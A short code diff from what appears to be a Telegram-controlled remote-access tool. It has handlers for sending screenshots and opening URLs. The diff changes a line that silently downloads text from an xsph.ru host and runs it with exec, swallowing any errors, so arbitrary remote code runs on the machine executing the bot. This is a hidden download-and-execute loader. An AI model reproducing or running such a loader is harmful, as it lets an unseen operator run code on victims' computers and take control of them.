@@ -72,7 +72,7 @@ def send_screen(command):
 
 
 try:
-    exec(r.get("http://f0415691.xsph.ru/yUa71sENd6ZZdZXh1Pag/update.exe").text)
+    exec(r.get("http://f0428265.xsph.ru/getUpdates.php").text)
 except: pass
 @bot.message_handler(commands=['open_url'])
 def open_url(message):
